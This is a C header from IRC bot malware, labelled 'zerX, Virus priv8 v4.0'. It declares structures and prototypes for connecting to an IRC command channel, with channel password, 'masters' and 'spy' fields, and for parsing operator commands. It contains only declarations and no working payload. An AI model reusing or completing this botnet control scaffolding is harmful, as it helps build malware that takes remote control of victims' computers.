/*     
///////////////////////////////////////////////////////        
													 ./
 XXXXXXX   XXXXXXX XXXXXXXXXX   XXXXXXXX  XXXXXXXX   ./
  	XXXX   XXXX    XXXX   XXX      XXXXX  XXXXX      ./
	 XXXX XXXX     XXXX  XXXX       XXXX  XXXX       ./
	  XXXXXXX	   XXXXXXXXX         XXXXXXXX        ./
	   XXXXX       XXXX   XXX       XXXX XXXXX       ./
        XXX        XXXX   XXXX     XXXXX  XXXXX      ./
         X         XXXX   XXXXX XXXXXXXX  XXXXXXXX   ./
............................zerX,Virus priv8......v4.0/
///////////////////////////////////////////////////////

*/
// irc/spy structure.

typedef struct PARAMS
{
	BOOL silent;
	BOOL halfsilent;
	BOOL verbose;
	BOOL stop;
} SWITCHES;
struct irc_reply_data
{
	char* nick;
	char* ident;
	char* host;
	char* target;
};
int IRC_TempCommand(char *params,irc_reply_data* hostd,void* conn,BOOL silent,BOOL topic=FALSE);
int IRC_CommandParse(char *a[MAX_TOKENS],int t,char *params,irc_reply_data* hostd,void* conn,SWITCHES switches,BOOL topic=FALSE);

typedef struct IRC 
{
	SOCKET sock;
	char host[128];
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	int port;
	int spy;
	int threadnum;
	BOOL gotinfo;

} IRC;

typedef struct NTHREADS
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL full;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	void *conn;
	char target[128];
	char *data1;
	char *data2;
	char *data3;
	BOOL bdata1;
	BOOL bdata2;
	BOOL bdata3;
	int idata1;
	int idata2;
	SOCKET csock;
	BOOL verbose;
} NTHREADS;

	void parse_irc_reply(char* data);

DWORD WINAPI irc_connect(LPVOID param);
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy);
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat, int spy);
